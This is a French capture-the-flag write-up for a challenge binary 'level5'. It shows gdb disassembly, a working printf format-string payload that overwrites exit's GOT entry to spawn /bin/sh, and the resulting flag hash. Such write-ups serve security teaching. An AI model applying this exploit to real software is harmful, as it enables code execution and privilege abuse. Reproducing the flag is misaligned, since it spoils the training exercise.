
# level5


## description
- Il y a un exécutable **level5**.Lorsqu'on l'exécute, il prends des caractères sur **stdin** puis l'affiche.

## Résolution

    0x0804850a <+6>:     call   0x80484c2 <n>

Dans la fonction main il n'y a rien d'utile.Juste un appel a la fonction n.


     0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
     0x080484f3 <+49>:    call   0x8048380 <printf@plt>
Un appel à **fgets** et à **printf** donc on va exploit le **format string** de printf.

Grace à la commande **info fonction** de **gdb**. on peut voir qu'il y a une fonction o qui n'est pas appelée.

     0x080484aa <+6>:     movl   $0x80485f0,(%esp)
     0x080484b1 <+13>:    call   0x80483b0 <system@plt>
Il y a un appel de **system** sur **"/bin/sh"**

On ne va pas pouvoir modifier l'adresse de retour parce que les fonctions **o** et **n** ne retourne rien et s'arrête avec l'utilisation de la fonction **exit**.
On va devoir remplacer l'adresse de **exit** présente de la [Global Offset Table](https://en.wikipedia.org/wiki/Global_Offset_Table) par l'adresse de la fonction **o**(0x080484a4).

Pour avoir l'adresse de **exit**, on va utiliser la commande **disas** de gdb sur l'adresse de l'appel de **exit** dans la fonction **n**.

     0x080484ff <+61>:    call   0x80483d0 <exit@plt>

On peut utiliser **disas** sur **0x80483d0**
  

    0x080483d0 <+0>:     jmp    DWORD PTR ds:0x8049838

Maintenant que l'on a l'adresse d'**exit**(0x8049838) et l'adresse de **o**(0x080484a4), 

On passe l'adresse de **exit** en **little endian**: \x38\x98\x04\x08.
On converti l'adresse de **o** en **décimal** pour l'utiliser dans le printf avec le modifier **%d** : 134513828 - 4(taille de l'adresse de exit).


Ensuite, on trouve ou est l'adresse de exit.

    python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit2 && cat /tmp/exploit2 | ./level5 
    aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
l'adresse d'exit est a la 4e position.

```
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit2 && cat /tmp/exploit2 - | ./level5
```
Ca prends un certains temps pour finir à cause de la taille de l'adresse de o en décimal.

On obtient le flag.

    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
